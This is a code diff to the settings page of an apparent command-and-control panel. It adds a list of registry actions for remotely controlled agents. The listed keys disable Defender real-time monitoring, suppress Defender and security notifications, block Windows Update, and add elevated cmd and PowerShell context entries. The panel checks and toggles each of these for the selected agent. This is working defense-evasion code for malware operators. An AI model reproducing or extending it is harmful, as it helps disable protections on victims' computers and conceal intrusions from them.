@@ -120,7 +120,7 @@ interface C2Settings {
 
 export function Settings() {
   const { theme, setTheme } = useTheme();
-  const { logout, agents, selectedAgent, setSelectedAgent, sendCommand } = useSocket();
+  const { logout, agents, selectedAgent, setSelectedAgent, sendCommand, registryPresence, checkRegistryPresence } = useSocket();
   const [showPasswords, setShowPasswords] = useState({
     admin: false,
     operator: false,
@@ -249,6 +249,35 @@ export function Settings() {
     enrolled: false,
     issuer: ''
   });
+
+  const registryActionList: Array<{ id: string; actionKey: keyof NonNullable<NonNullable<C2Settings['registry']>['actions']>; label: string; hive: string; path: string; key: string }> = [
+    { id: 'policy_push_notifications', actionKey: 'policy_push_notifications', label: 'Policy Push Notifications', hive: 'HKLM', path: 'SOFTWARE\\Policies\\Microsoft\\Windows\\PushNotifications', key: 'NoCloudApplicationNotification' },
+    { id: 'policy_windows_update', actionKey: 'policy_windows_update', label: 'Policy Windows Update', hive: 'HKLM', path: 'SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate', key: 'DisableOSUpgrade' },
+    { id: 'context_runas_cmd', actionKey: 'context_runas_cmd', label: 'Context Runas CMD', hive: 'HKCU', path: 'Software\\Classes\\Directory\\Background\\shell\\runas_cmd', key: '' },
+    { id: 'context_powershell_admin', actionKey: 'context_powershell_admin', label: 'Context PowerShell Admin', hive: 'HKCU', path: 'Software\\Classes\\Directory\\Background\\shell\\powershell_admin', key: '' },
+    { id: 'notify_center_hkcu', actionKey: 'notify_center_hkcu', label: 'Notification Center (HKCU)', hive: 'HKCU', path: 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications', key: 'ToastEnabled' },
+    { id: 'notify_center_hklm', actionKey: 'notify_center_hklm', label: 'Notification Center (HKLM)', hive: 'HKLM', path: 'SOFTWARE\\Policies\\Microsoft\\Windows\\PushNotifications', key: 'NoCloudApplicationNotification' },
+    { id: 'defender_ux_suppress', actionKey: 'defender_ux_suppress', label: 'Defender UX Suppress', hive: 'HKLM', path: 'SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration', key: 'Notification_Suppress' },
+    { id: 'toast_global_above_lock', actionKey: 'toast_global_above_lock', label: 'Toast Global Above Lock', hive: 'HKLM', path: 'SOFTWARE\\Policies\\Microsoft\\Windows\\System', key: 'DisableLockScreenAppNotifications' },
+    { id: 'toast_global_critical_above_lock', actionKey: 'toast_global_critical_above_lock', label: 'Toast Global Critical Above Lock', hive: 'HKLM', path: 'SOFTWARE\\Policies\\Microsoft\\Windows\\System', key: 'EnableLockScreenAppNotifications' },
+    { id: 'toast_windows_update', actionKey: 'toast_windows_update', label: 'Toast Windows Update', hive: 'HKLM', path: 'SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate', key: 'DoNotConnectToWindowsUpdateInternetLocations' },
+    { id: 'toast_security_maintenance', actionKey: 'toast_security_maintenance', label: 'Toast Security & Maintenance', hive: 'HKLM', path: 'SOFTWARE\\Policies\\Microsoft\\Windows\\SecurityHealth', key: 'SuppressNotifications' },
+    { id: 'toast_windows_security', actionKey: 'toast_windows_security', label: 'Toast Windows Security', hive: 'HKLM', path: 'SOFTWARE\\Microsoft\\Windows Defender Security Center\\Notifications', key: 'EnableNotifications' },
+    { id: 'toast_sec_health_ui', actionKey: 'toast_sec_health_ui', label: 'Toast Security Health UI', hive: 'HKLM', path: 'SOFTWARE\\Policies\\Microsoft\\Windows\\SecurityHealth', key: 'SuppressNotifications' },
+    { id: 'explorer_balloon_tips', actionKey: 'explorer_balloon_tips', label: 'Explorer Balloon Tips', hive: 'HKCU', path: 'Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced', key: 'EnableBalloonTips' },
+    { id: 'explorer_info_tip', actionKey: 'explorer_info_tip', label: 'Explorer Info Tip', hive: 'HKCU', path: 'Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced', key: 'ShowInfoTip' },
+    { id: 'disableRealtimeMonitoring', actionKey: 'disableRealtimeMonitoring', label: 'Defender Disable Realtime Monitoring', hive: 'HKLM', path: 'SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection', key: 'DisableRealtimeMonitoring' },
+  ];
+
+  useEffect(() => {
+    try {
+      const agentId = selectedAgent;
+      if (!agentId) return;
+      const items = registryActionList.map(x => ({ id: x.id, hive: x.hive, path: x.path, key: x.key }));
+      checkRegistryPresence(agentId, items);
+    } catch {}
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [selectedAgent]);
 
   const updateSetting = (category: keyof C2Settings, key: string, value: any) => {
     setSettings(prev => ({
@@ -1426,6 +1455,50 @@ export function Settings() {
                     <Trash2 className="h-4 w-4" />
                     <span>Clear All Data</span>
                   </Button>
+                </div>
+              </div>
+
+              <Separator />
+
+              <div className="space-y-4">
+                <h4 className="font-medium">Registry Actions</h4>
+                <div className="space-y-3">
+                  {registryActionList.map((act) => {
+                    const presence = (selectedAgent && registryPresence[selectedAgent] ? registryPresence[selectedAgent][act.id] : undefined);
+                    const present = Boolean(presence?.present);
+                    return (
+                      <div key={act.id} className="flex items-center justify-between">
+                        <Label htmlFor={`reg-${act.id}`}>{act.label}</Label>
+                        <div className="flex items-center gap-3">
+                          <Badge variant={present ? 'default' : 'secondary'} className={present ? 'bg-green-600' : ''}>
+                            {present ? 'Present' : 'Not Found'}
+                          </Badge>
+                          <Switch
+                            id={`reg-${act.id}`}
+                            checked={Boolean(settings.registry?.actions?.[act.actionKey])}
+                            onCheckedChange={(checked) => {
+                              const next = { ...(settings.registry?.actions || {}) };
+                              (next as any)[act.actionKey] = checked;
+                              setSettings(prev => ({
+                                ...prev,
+                                registry: {
+                                  ...prev.registry!,
+                                  actions: next
+                                }
+                              }));
+                              setHasChanges(true);
+                              setSaved(false);
+                              try {
+                                if (selectedAgent) {
+                                  checkRegistryPresence(selectedAgent, [{ id: act.id, hive: act.hive, path: act.path, key: act.key }]);
+                                }
+                              } catch {}
+                            }}
+                          />
+                        </div>
+                      </div>
+                    );
+                  })}
                 </div>
               </div>
             </CardContent>
